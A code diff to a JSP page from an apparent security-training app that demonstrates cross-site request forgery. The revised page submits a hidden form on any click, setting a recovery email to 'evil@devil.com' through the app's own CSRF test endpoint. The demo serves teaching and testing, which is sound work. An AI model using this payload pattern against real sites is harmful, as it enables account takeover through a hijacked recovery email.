@@ -2,29 +2,21 @@
 <html>
 <head>
 <title>Test CSRF</title>
+<script>
+	function submitRequest()
+	{
+		document.getElementById("updateEmail").submit();
+	}
+</script>
 </head>
 
-<body>
+<body onclick="submitRequest()">
 	<h3>Demystify CSRF</h3>
 
-<h4 onclick="submitRequest()">Thanks for visiting this Fraud Website, I've triggered a GET/POST request to update the recevery email address. You can check it in developer tool.</h4>
-	 <form action="http://127.0.0.1:8082/painTest/result/csrf?" method="${param.method}" id="updateEmail">
-		<input type="text" name="email" value="test@best.com">
+<h4>Thanks for visiting this Fraud Website, Click anywhere on the page to trigger a GET/POST request to update your recovery email address.</h4>
+	 <form action="${pageContext.request.contextPath}/result/csrf?" method="${param.method}" id="updateEmail">
+		<input type="hidden" name="email" value="evil@devil.com">
 		<input type="hidden" name="param" value="${param.path}">
 	</form>
 </body>
-
-<script >
-function submitRequest()
-{
-	/*var httpRequest=new XMLHttpRequest();
-	//httpRequest.open("POST", "restricted/result/csrf", false);
-	httpRequest.open("POST", "http://127.0.0.1:8080/painTest/result/csrf", false);
-	httpRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-	httpRequest.send("email=jamdagni");
-	console.log(httpRequest.responseText); */
-	document.getElementById("updateEmail").submit();
-}
-</script>
-
 </html>
